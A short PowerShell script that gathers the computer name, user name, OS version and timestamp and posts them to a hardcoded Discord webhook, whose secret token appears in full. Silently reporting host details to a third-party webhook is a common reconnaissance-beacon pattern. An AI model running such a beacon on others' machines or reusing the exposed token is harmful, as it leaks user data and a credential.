# Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1393268541138010273/_XvoosQeG3JRaRI7XZ5LjbpQ4EKoD8SyDovgLw2fgC47jkh1Tjj9NeAKhnMNxDfT5Jye"

# Gather info
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$osVersion = (Get-CimInstance Win32_OperatingSystem).Caption
$timeStamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

# Prepare JSON payload for Discord webhook
$body = @{
    username = "InfoBot"
    content = ""
    embeds = @(
        @{
            title = "Basic System Info"
            color = 3447003  # Blue color
            fields = @(
                @{ name = "Computer Name"; value = $computerName; inline = $true },
                @{ name = "User Name"; value = $userName; inline = $true },
                @{ name = "OS Version"; value = $osVersion; inline = $false },
                @{ name = "Timestamp"; value = $timeStamp; inline = $false }
            )
        }
    )
} | ConvertTo-Json -Depth 4

# Send POST request to Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
